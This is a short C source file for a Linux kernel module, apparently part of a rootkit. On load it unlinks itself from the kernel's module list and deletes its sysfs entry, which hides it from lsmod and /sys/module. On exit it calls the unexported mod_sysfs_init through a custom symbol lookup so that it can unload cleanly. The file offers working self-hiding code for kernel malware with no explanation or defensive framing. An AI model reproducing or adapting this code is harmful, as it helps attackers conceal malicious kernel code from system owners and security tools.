#include <linux/list.h>
#include <linux/module.h>
#include <linux/kobject.h>
#include <linux/vmalloc.h>

#include "module.h"

#include "../../sys/symbol.h"

// module_init already exists in module.h
int module_init_(void)
{
    list_del(&THIS_MODULE->list);
    kobject_del(&THIS_MODULE->mkobj.kobj);

    return 0;
}

int module_exit_(void)
{
    // prevent a bug during module exit where mod->mkobj.kobj is not initialized
    int (*mod_sysfs_init)(struct module*) = (int(*)(struct module*))sym_lookup("mod_sysfs_init");
    mod_sysfs_init(THIS_MODULE);

    return 0;
}